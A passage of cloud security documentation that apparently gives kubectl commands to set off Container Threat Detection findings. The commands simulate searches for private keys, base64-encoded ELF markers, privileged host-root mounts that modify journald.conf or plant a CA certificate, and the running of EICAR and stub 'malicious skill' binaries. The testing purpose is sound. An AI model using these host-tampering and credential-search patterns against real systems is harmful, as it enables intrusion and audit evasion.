To trigger an `Credential Access: GPG Key Reconnaissance` finding, a binary capable of searching file contents needs to be executed within a container. This example uses the latest Ubuntu 24.04 image. It copies `/bin/ls` and renames that to `find` (or another suitable search utility like grep). The renamed binary is then executed with arguments that specify a search pattern indicative of private keys or passwords, or content patterns suggesting passwords or secrets. This action is flagged as suspicious because it mimics the behavior observed when attempting to locate GPG security keys.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a search tool binary like `find` with appropriate arguments:

     * x86 node:
           
           tag="ktd-test-gpg-key-reconnaissance-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/find; /tmp/find secring.gpg"
           

     * ARM node:
           
           tag="ktd-test-gpg-key-reconnaissance-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/find; /tmp/find secring.gpg"
           




This test procedure creates an `Credential Access: GPG Key Reconnaissance` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Credential Access: Search Private Keys or Passwords

To trigger an `Credential Access: Search Private Keys or Passwords` finding, a binary capable of searching file contents needs to be executed within a container. This example uses the latest Ubuntu 24.04 image. It copies `/bin/ls` and renames that to `find` (or another suitable search utility like grep). The renamed binary is then executed with arguments that specify a search pattern indicative of private keys or passwords, or content patterns suggesting passwords or secrets. This action is flagged as suspicious because it mimics the behavior observed when attempting to locate sensitive information like private keys or passwords within a containerized environment.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a search tool binary like `find` with appropriate arguments:

     * x86 node:
           
           tag="ktd-test-search-private-keys-or-pw-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/find; /tmp/find id_rsa"
           

     * ARM node:
           
           tag="ktd-test-search-private-keys-or-pw-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/find; /tmp/find id_rsa"
           




This test procedure creates an `Credential Access: Search Private Keys or Passwords` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Defense Evasion: Base64 ELF File Command Line

To trigger an `Defense Evasion: Base64 ELF File Command Line` finding, a process must have `base64` as an argument and `f0VMRgIB` as an argument which is the base64 encoded form of `ELF`. This example uses the latest Ubuntu 24.04 image. `base64` is then executed with the `-d` and `f0VMRgIB` arguments. This action is flagged as suspicious because it mimics the behavior observed when attempting to decode binary data to execute malicious code.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a search tool binary like `find` with appropriate arguments:

     * x86 node:
           
           tag="ktd-test-base64-elf-file-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "base64 -d f0VMRgIB"
           

     * ARM node:
           
           tag="ktd-test-base64-elf-file-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "base64 -d f0VMRgIB"
           




This test procedure creates two `Defense Evasion: Base64 ELF File Command Line` findings that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center. Two findings are created because the initial `bash -c` command as well as the execution of the `base64 -d` command satisfy the finding criteria.

## Defense Evasion: Base64 Encoded Python Script Executed

To trigger an `Defense Evasion: Base64 Encoded Python Script Executed` finding, a process must have `echo` or `base64` as an argument and `aW1wb3J0IH` as an argument which is the base64 encoded form of `python -c`. This example uses the latest Ubuntu 24.04 image. `echo` is then executed with the `aW1wb3J0IH` argument. This action is flagged as suspicious because it mimics the behavior observed when attempting to decode binary data to execute malicious code.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a search tool binary like `find` with appropriate arguments:

     * x86 node:
           
           tag="ktd-test-base64-elf-file-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "echo aW1wb3J0IH"
           

     * ARM node:
           
           tag="ktd-test-base64-elf-file-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "echo aW1wb3J0IH"
           




This test procedure creates a `Defense Evasion: Base64 Encoded Python Script Executed` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Defense Evasion: Base64 Encoded Shell Script Executed

To trigger an `Defense Evasion: Base64 Encoded Shell Script Executed` finding, a process must have `echo` or `base64` as an argument and `IyEvYmluL2Jhc2gK` as an argument which is the base64 encoded form of `#!/bin/bash`. This example uses the latest Ubuntu 24.04 image. `echo` is then executed with the `IyEvYmluL2Jhc2gK` argument. This action is flagged as suspicious because it mimics the behavior observed when attempting to decode binary data to execute malicious code.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a search tool binary like `find` with appropriate arguments:

     * x86 node:
           
           tag="ktd-test-base64-elf-file-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "echo IyEvYmluL2Jhc2gK"
           

     * ARM node:
           
           tag="ktd-test-base64-elf-file-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "echo IyEvYmluL2Jhc2gK"
           




This test procedure creates a `Defense Evasion: Base64 Encoded Shell Script Executed` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Defense Evasion: Disable or Modify Linux Audit System ([Preview](https://cloud.google.com/products/#product-launch-stages))

To trigger a Disable or Modify Linux Audit Modification detection, modify one of the host's auditing-related configuration files. This example deploys the latest Ubuntu 24.04 image, mounting the host's root file system into the container, and then modifies `/etc/systemd/journald.conf`.

This is a file monitoring detector and has [specific GKE version requirements](https://cloud.google.com/security-command-center/docs/how-to-use-container-threat-detection#gke-version).

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a binary that modifies one of the host's audit-related configuration files, such as `/etc/systemd/journald.conf`.

     * x86 node:
           
           tag="ktd-test-audit-mod-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never --rm=true -ti --image ubuntu "$tag"\
              --overrides='{"apiVersion": "v1", "spec": {
              "containers":[{"command": ["sh", "-c", "/bin/echo >> /host/etc/systemd/journald.conf"],
              "name": "'$tag'", "image": "marketplace.gcr.io/google/ubuntu2404:latest",
              "securityContext": {"privileged": true},
              "volumeMounts":[{"mountPath": "/host/", "name": "host-mount",
              "readOnly": false}]}],
              "volumes": [{"name": "host-mount","hostPath": {"path": "/"}}]}}'
           

     * ARM node:
           
           tag="ktd-test-audit-mod-arm-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never --rm=true -ti --image ubuntu "$tag"\
              --overrides='{"apiVersion": "v1", "spec": {
              "containers":[{"command": ["sh", "-c", "/bin/echo >> /host/etc/systemd/journald.conf"],
              "name": "'$tag'", "image": "marketplace.gcr.io/google/ubuntu2404:latest",
              "securityContext": {"privileged": true},
              "volumeMounts":[{"mountPath": "/host/", "name": "host-mount",
              "readOnly": false}]}],
              "volumes": [{"name": "host-mount","hostPath": {"path": "/"}}],
              "nodeSelector": {"kubernetes.io/arch":"arm64"}, "tolerations":[{ "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" }] }}'
           




This test procedure triggers a `Disable or Modify Linux Audit System` finding that you can view in Security Command Center and, if you have configured Logging for Container Threat Detection, in Cloud Logging. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center at the organization level.

## Defense Evasion: Launch Code Compiler Tool In Container

To trigger a `Defense Evasion: Launch Code Compiler Tool In Container` ([Preview](https://cloud.google.com/products/#product-launch-stages)) finding, a code compiler tool must execute within a container. This example uses the latest Ubuntu 24.04 image. It copies `/bin/ls` and renames that to `gcc10` (or another compiler like `clang`). This behavior is flagged as suspicious because it can indicate an attempt to compile and execute malicious code within the container to evade detection or modify its behavior.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Execute a compiler binary like `gcc10` with appropriate arguments:

     * x86 node:
           
           tag="ktd-test-launch-code-compiler-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/gcc10; /tmp/gcc10 -o /tmp/gcc10.o"
           

     * ARM node:
           
           tag="ktd-test-launch-code-compiler-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- bash -c \
                 "cp /bin/ls /tmp/gcc10; /tmp/gcc10 -o /tmp/gcc10.o"
           




This test procedure creates a `Defense Evasion: Launch Code Compiler Tool In Container` finding that you can view in Security Command Center and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Defense Evasion: Root Certificate Installed ([Preview](https://cloud.google.com/products/#product-launch-stages))

To trigger a Root Certificate Installed detection, create a root certificate file on the host from a container. This example deploys the latest Ubuntu 24.04 image, mounting the host's root file system into the container. It then creates an empty certificate file in an appropriate directory.

This is a file monitoring detector and has [specific GKE version requirements](https://cloud.google.com/security-command-center/docs/how-to-use-container-threat-detection#gke-version).

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Install a certificate file onto the host from a container.

     * x86 node:
           
           tag="ktd-test-cert-install-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never --rm=true -ti --image ubuntu "$tag"\
              --overrides='{"apiVersion": "v1", "spec": {
              "containers":[{"command": ["sh", "-c", "mkdir -p /host/etc/pki/tls/certs; /bin/touch /host/etc/pki/tls/certs/ca-bundle.crt"],
              "name": "'$tag'", "image": "marketplace.gcr.io/google/ubuntu2404:latest",
              "securityContext": {"privileged": true},
              "volumeMounts":[{"mountPath": "/host/", "name": "host-mount",
              "readOnly": false}]}],
              "volumes": [{"name": "host-mount","hostPath": {"path": "/"}}]}}'
           

     * ARM node:
           
           tag="ktd-test-cert-install-arm-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never --rm=true -ti --image ubuntu "$tag"\
              --overrides='{"apiVersion": "v1", "spec": {
              "containers":[{"command": ["sh", "-c", "mkdir -p /host/etc/pki/tls/certs; /bin/touch /host/etc/pki/tls/certs/ca-bundle.crt"],
              "name": "'$tag'", "image": "marketplace.gcr.io/google/ubuntu2404:latest",
              "securityContext": {"privileged": true},
              "volumeMounts":[{"mountPath": "/host/", "name": "host-mount",
              "readOnly": false}]}],
              "volumes": [{"name": "host-mount","hostPath": {"path": "/"}}],
              "nodeSelector": {"kubernetes.io/arch":"arm64"}, "tolerations":[{ "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" }] }}'
           

This test procedure triggers a Root Certificate Installed finding that you can view in Security Command Center and, if you have configured Logging for Container Threat Detection, in Cloud Logging. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center at the organization level.




## Execution: Added Malicious Binary Executed

To trigger an Execution: Added Malicious Binary Executed finding, drop a malicious binary in your container and execute it. This example deploys the latest Ubuntu 24.04 image, creates a simulated malicious file, and then executes it. The binary's execution is unexpected because the simulated malicious binary wasn't part of the original container image, and the binary is an [EICAR](https://en.wikipedia.org/wiki/EICAR_test_file) test file, a file classified as malicious by the threat intelligence.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Drop the EICAR binary and execute it:

     * x86 node:
           
           tag="ktd-test-added-malicious-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           eicar='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- sh -c \
                 "touch /tmp/test_mal_file; echo -n '$eicar' > /tmp/test_mal_file; chmod 700 /tmp/test_mal_file; /tmp/test_mal_file; sleep 10"
           

     * ARM node:
           
           tag="ktd-test-added-malicious-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           eicar='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- sh -c \
                 "touch /tmp/test_mal_file; echo -n '$eicar' > /tmp/test_mal_file; chmod 700 /tmp/test_mal_file; /tmp/test_mal_file; sleep 10"
           




This test procedure creates an Execution: Added Malicious Binary Executed finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Added Malicious Library Loaded

To trigger an Execution: Added Malicious Library Loaded finding, add a malicious library in your container and load it. This example deploys the latest Ubuntu 24.04 image, creates a simulated malicious library, and then loads it using `mmap`. The library loading is unexpected because the simulated malicious library wasn't part of the original container image and because the library is an [EICAR](https://en.wikipedia.org/wiki/EICAR_test_file) test file, which is classified as malicious by threat intelligence.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Add the EICAR file and load it:

     * x86 node:
           
           tag="ktd-test-added-malicious-library-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           eicar='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- sh -c "
                 apt-get update && apt-get install -y gcc libc-dev --no-install-recommends > /dev/null 2>&1;
                 echo -n '$eicar' > /tmp/test_mal_lib;
                 cat << 'EOF' > /tmp/loader.c
           #include <fcntl.h>
           #include <sys/mman.h>
           #include <sys/stat.h>
           #include <unistd.h>
           #include <stdlib.h>
           int main(int argc, char *argv[]) {
              int fd = open(argv[1], O_RDONLY);
              if (fd == -1) return 1;
              struct stat sb;
              if (fstat(fd, &sb) == -1) return 1;
              void* addr = mmap(NULL, sb.st_size, PROT_EXEC, MAP_PRIVATE, fd, 0);
              if (addr == MAP_FAILED) return 1;
              write(1, addr, sb.st_size);
              munmap(addr, sb.st_size);
              close(fd);
              return 0;
           }
           EOF
                 gcc /tmp/loader.c -o /tmp/loader && /tmp/loader /tmp/test_mal_lib
                 sleep 10"
           

     * ARM node:
           
           tag="ktd-test-added-malicious-library-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           eicar='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
           "$tag" -- sh -c "
                 apt-get update && apt-get install -y gcc libc-dev --no-install-recommends > /dev/null 2>&1;
                 echo -n '$eicar' > /tmp/test_mal_lib;
                 cat << 'EOF' > /tmp/loader.c
           #include <fcntl.h>
           #include <sys/mman.h>
           #include <sys/stat.h>
           #include <unistd.h>
           #include <stdlib.h>
           int main(int argc, char *argv[]) {
              int fd = open(argv[1], O_RDONLY);
              if (fd == -1) return 1;
              struct stat sb;
              if (fstat(fd, &sb) == -1) return 1;
              void* addr = mmap(NULL, sb.st_size, PROT_EXEC, MAP_PRIVATE, fd, 0);
              if (addr == MAP_FAILED) return 1;
              write(1, addr, sb.st_size);
              munmap(addr, sb.st_size);
              close(fd);
              return 0;
           }
           EOF
                 gcc /tmp/loader.c -o /tmp/loader && /tmp/loader /tmp/test_mal_lib
                 sleep 10"
           




This test procedure creates an Execution: Added Malicious Library Loaded finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Added Malicious Skill Executed

To trigger an `Execution: Added Malicious Skill Executed` finding, add a malicious skill binary in your container and execute it. This example deploys the latest Ubuntu 24.04 image, creates a simulated malicious file, and then executes it. The binary's execution is unexpected because the simulated malicious binary wasn't part of the original container image, and the binary contains a specific test hash classified as a malicious skill by threat intelligence.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Add the malicious skill binary and execute it:

     * x86 node:
           
           b64_payload=$(echo 'int main(){/*Malicious Skill Test*/return 0;}' > dummy.c && export SOURCE_DATE_EPOCH=1600000000 && gcc -ffile-prefix-map="$(pwd)=." -Wl,--build-id=none dummy.c -o dummy && base64 -w 0 dummy)
           tag="ktd-test-added-malicious-skill-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- sh -c "echo '$b64_payload' | base64 -d > /tmp/test_mal_file && chmod 700 /tmp/test_mal_file && /tmp/test_mal_file && sha256sum /tmp/test_mal_file"
           

     * ARM node:
           
           b64_payload=$(echo 'int main(){/*Malicious Skill Test*/return 0;}' > dummy.c && export SOURCE_DATE_EPOCH=1600000000 && gcc -ffile-prefix-map="$(pwd)=." -Wl,--build-id=none dummy.c -o dummy && base64 -w 0 dummy)
           tag="ktd-test-added-malicious-skill-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- sh -c "echo '$b64_payload' | base64 -d > /tmp/test_mal_file && chmod 700 /tmp/test_mal_file && /tmp/test_mal_file && sha256sum /tmp/test_mal_file"
           




This test procedure creates an `Execution: Added Malicious Skill Executed` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Modified Malicious Skill Executed

To trigger an `Execution: Modified Malicious Skill Executed` finding, modify an existing binary with a malicious skill binary in your container and execute it. This example deploys the latest Ubuntu 24.04 image, overwrites a system file (`/etc/issue`) with a simulated malicious file, and then executes it. The binary's execution is unexpected because the simulated malicious binary contains a specific test hash classified as a malicious skill by threat intelligence.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Modify a system component with the malicious skill binary and execute it:

     * x86 node:
           
           b64_payload=$(echo 'int main(){/*Malicious Skill Test*/return 0;}' > dummy.c && export SOURCE_DATE_EPOCH=1600000000 && gcc -ffile-prefix-map="$(pwd)=." -Wl,--build-id=none dummy.c -o dummy && base64 -w 0 dummy)
           tag="ktd-test-modified-malicious-skill-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- sh -c "echo '$b64_payload' | base64 -d > /etc/issue && chmod 700 /etc/issue && /etc/issue && sha256sum /etc/issue"
           

     * ARM node:
           
           b64_payload=$(echo 'int main(){/*Malicious Skill Test*/return 0;}' > dummy.c && export SOURCE_DATE_EPOCH=1600000000 && gcc -ffile-prefix-map="$(pwd)=." -Wl,--build-id=none dummy.c -o dummy && base64 -w 0 dummy)
           tag="ktd-test-modified-malicious-skill-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- sh -c "echo '$b64_payload' | base64 -d > /etc/issue && chmod 700 /etc/issue && /etc/issue && sha256sum /etc/issue"
           




This test procedure creates an `Execution: Modified Malicious Skill Executed` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Added Malicious Skill Loaded

To trigger an `Execution: Added Malicious Skill Loaded` finding, add a malicious skill library in your container and load it. This example deploys the latest Ubuntu 24.04 image, creates a simulated malicious library, and then loads it using `mmap`. The library loading is unexpected because the simulated malicious library wasn't part of the original container image and because the library contains a specific test hash classified as a malicious skill by threat intelligence.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Add the malicious skill library and load it:

     * x86 node:
           
           b64_payload=$(echo 'int main(){/*Malicious Skill Test*/return 0;}' > dummy.c && export SOURCE_DATE_EPOCH=1600000000 && gcc -ffile-prefix-map="$(pwd)=." -Wl,--build-id=none dummy.c -o dummy && base64 -w 0 dummy)
           tag="ktd-test-mmap-loader-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              "$tag" -- sh -c "
                 apt-get update && apt-get install -y gcc libc-dev --no-install-recommends > /dev/null 2>&1;
                 echo '$b64_payload' | base64 -d > /tmp/test_mal_file;
                 chmod 700 /tmp/test_mal_file;
                 cat << 'EOF' > /tmp/loader.c
           #include <fcntl.h>
           #include <sys/mman.h>
           #include <sys/stat.h>
           #include <unistd.h>
           #include <stdlib.h>
           int main(int argc, char *argv[]) {
              int fd = open(argv[1], O_RDONLY);
              if (fd == -1) return 1;
              struct stat sb;
              if (fstat(fd, &sb) == -1) return 1;
              void* addr = mmap(NULL, sb.st_size, PROT_EXEC, MAP_PRIVATE, fd, 0);
              if (addr == MAP_FAILED) return 1;
              write(1, addr, sb.st_size);
              munmap(addr, sb.st_size);
              close(fd);
              return 0;
           }
           EOF
                 gcc /tmp/loader.c -o /tmp/loader;
                 /tmp/loader /tmp/test_mal_file;
                 sha256sum /tmp/test_mal_file;
                 sleep 10"
           

     * ARM node:
           
           b64_payload=$(echo 'int main(){/*Malicious Skill Test*/return 0;}' > dummy.c && export SOURCE_DATE_EPOCH=1600000000 && gcc -ffile-prefix-map="$(pwd)=." -Wl,--build-id=none dummy.c -o dummy && base64 -w 0 dummy)
           tag="ktd-test-mmap-loader-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
           kubectl run \
              --restart=Never \
              --rm=true -i \
              --image marketplace.gcr.io/google/ubuntu2404:latest \
              --overrides='{"apiVersion": "v1", "spec": { "nodeSelector":
              {"kubernetes.io/arch":"arm64"}, "tolerations":[ { "effect":
              "NoSchedule", "key": "kubernetes.io/arch", "operator": "Equal",
              "value": "arm64" } ]}}' \
              "$tag" -- sh -c "
                 apt-get update && apt-get install -y gcc libc-dev --no-install-recommends > /dev/null 2>&1;
                 echo '$b64_payload' | base64 -d > /tmp/test_mal_file;
                 chmod 700 /tmp/test_mal_file;
                 cat << 'EOF' > /tmp/loader.c
           #include <fcntl.h>
           #include <sys/mman.h>
           #include <sys/stat.h>
           #include <unistd.h>
           #include <stdlib.h>
           int main(int argc, char *argv[]) {
              int fd = open(argv[1], O_RDONLY);
              if (fd == -1) return 1;
              struct stat sb;
              if (fstat(fd, &sb) == -1) return 1;
              void* addr = mmap(NULL, sb.st_size, PROT_EXEC, MAP_PRIVATE, fd, 0);
              if (addr == MAP_FAILED) return 1;
              write(1, addr, sb.st_size);
              munmap(addr, sb.st_size);
              close(fd);
              return 0;
           }
           EOF
                 gcc /tmp/loader.c -o /tmp/loader;
                 /tmp/loader /tmp/test_mal_file;
                 sha256sum /tmp/test_mal_file;
                 sleep 10"
           




This test procedure creates an `Execution: Added Malicious Skill Loaded` finding that you can view in Security Command Center, and in Cloud Logging if you've configured Logging for Container Threat Detection. Viewing findings in Cloud Logging is only available if you activate the Premium or Enterprise tier of Security Command Center.

## Execution: Modified Malicious Skill Loaded

To trigger an `Execution: Modified Malicious Skill Loaded` finding, modify an existing binary with a malicious skill library in your container and load it. This example deploys the latest Ubuntu 24.04 image, creates a simulated malicious library over a system file (`/etc/issue`), and then loads it using `mmap`. The library loading is unexpected because the simulated malicious library wasn't part of the original container image and because the library contains a specific test hash classified as a malicious skill by threat intelligence.

  1. Set environment variables.

  2. Use Cloud Shell to access the cluster control plane:
         
         gcloud container clusters get-credentials $CLUSTER_NAME \
             --zone $ZONE \
             --project $PROJECT
         

  3. Modify a system component with the malicious skill library and load it:

     * x86 node:
           
           b64_payload=$(echo 'int main(){/*Malicious Skill Test*/return 0;}' > dummy.c && export SOURCE_DATE_EPOCH=1600000000 && gcc -ffile-prefix-map="$(pwd)=." -Wl,--build-id=none dummy.c -o dummy && base64 -w 0 dummy)
           tag="ktd-test-mmap-loader-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
